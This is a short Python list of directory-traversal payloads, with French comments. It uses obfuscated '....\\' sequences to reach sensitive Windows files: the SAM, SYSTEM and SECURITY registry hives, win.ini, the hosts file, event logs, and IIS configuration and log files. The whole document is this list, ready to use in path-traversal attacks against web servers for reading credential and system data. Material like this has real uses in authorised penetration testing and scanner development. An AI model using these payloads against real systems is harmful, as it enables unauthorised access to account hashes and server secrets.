windows_traversals_4_encoded = [
    # Configuration système de base
    "....\\\\....\\\\....\\\\windows/win.ini",                    # Fichier historique toujours présent
    "....\\\\....\\\\....\\\\windows/system.ini",                  # Vieux fichier config Windows
    "....\\\\....\\\\....\\\\windows/system32/drivers/etc/hosts",  # Fichier hosts local
    "....\\\\....\\\\....\\\\windows/system32/drivers/etc/networks",
    "....\\\\....\\\\....\\\\windows/system32/drivers/etc/protocol",
    "....\\\\....\\\\....\\\\windows/system32/drivers/etc/services",

    # SAM et registre (attention, nécessite souvent des privilèges)
    "....\\\\....\\\\....\\\\windows/system32/config/SAM",         # Comptes locaux
    "....\\\\....\\\\....\\\\windows/system32/config/SYSTEM",      # Informations système
    "....\\\\....\\\\....\\\\windows/system32/config/SECURITY",    # Infos de sécurité
    "....\\\\....\\\\....\\\\windows/system32/config/SOFTWARE",    # Logiciels installés
    "....\\\\....\\\\....\\\\windows/system32/config/DEFAULT",     # Paramètres par défaut

    # Journaux d'événements
    "....\\\\....\\\\....\\\\windows/system32/winevt/Logs/System.evtx",
    "....\\\\....\\\\....\\\\windows/system32/winevt/Logs/Security.evtx",
    "....\\\\....\\\\....\\\\windows/system32/winevt/Logs/Application.evtx",

    # Fichiers de configuration IIS (serveur web)
    "....\\\\....\\\\....\\\\inetpub/logs/LogFiles/W3SVC1/u_ex230101.log",  # Exemple log IIS
    "....\\\\....\\\\....\\\\inetpub/wwwroot/web.config",                    # Config du site IIS
    "....\\\\....\\\\....\\\\windows/system32/inetsrv/config/applicationHost.config"  # Config globale IIS
]